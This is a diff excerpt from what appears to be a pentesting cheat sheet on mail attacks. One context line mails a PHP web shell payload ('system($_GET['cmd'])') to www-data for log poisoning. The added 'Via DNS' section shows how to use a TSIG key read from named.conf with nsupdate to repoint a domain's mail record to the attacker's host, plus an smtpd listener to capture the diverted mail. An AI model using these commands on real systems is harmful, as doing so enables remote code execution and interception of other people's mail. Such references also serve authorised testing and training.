@@ -130,3 +130,25 @@ data2
 ```bash
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
+
+### Via DNS
+
+> Check for :&#x20;
+>
+> ```
+> /etc/bind/named.conf
+> ```
+
+**Change the DNS record via nsupdate**
+
+```bash
+nsupdate
+> server $ip_target $port_dns_target
+> key $key_algorithm:$name_key $secret
+> zone $dns_name
+> update add mail.$target_domain 86400 A $ip_host
+> send
+
+# start python smtpd server to receive mail
+python3 -m smtpd -c DebuggingServer -n $ip_host:25
+```
